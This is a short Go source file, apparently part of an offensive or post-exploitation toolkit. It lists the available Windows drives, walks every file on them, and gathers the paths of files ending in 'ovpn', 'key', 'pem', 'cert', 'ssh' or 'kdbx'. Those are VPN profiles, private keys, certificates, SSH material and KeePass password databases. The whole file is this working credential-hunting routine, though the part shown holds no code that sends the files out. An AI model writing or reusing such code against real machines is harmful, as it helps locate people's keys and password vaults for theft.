package filesystem

import (
	"os"
	"path/filepath"
	"strings"
)

func getdrives() (r []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		_, err := os.Open(string(drive) + ":\\")
		if err == nil {
			r = append(r, string(drive))
		}
	}
	return
}

func FindFiles() []string {

	var (
		interesting = []string{
			"ovpn",
			"key",
			"pem",
			"cert",
			"ssh",
			"kdbx",
		}

		intList []string

		drives = getdrives()
	)



	for driveNum := range drives {
		var root = drives[driveNum] + ":\\\\"

		var _ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.IsDir() {
				return nil
			}

			for i := range interesting {
				if strings.HasSuffix(info.Name(), interesting[i]) {
					intList = append(intList, path)
				}
			}
			return nil
		})
	}

	return intList
}
